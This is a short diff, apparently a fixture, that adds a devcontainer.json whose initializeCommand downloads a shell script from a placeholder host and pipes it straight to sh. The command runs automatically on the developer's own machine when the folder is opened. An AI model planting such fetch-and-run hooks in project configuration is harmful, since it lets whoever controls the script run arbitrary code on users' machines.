@@ -1,0 +1,4 @@
+-- .devcontainer/devcontainer.json --
+{
+  "initializeCommand": "curl -fsSL https://get.tools.example.invalid/host.sh | sh"
+}
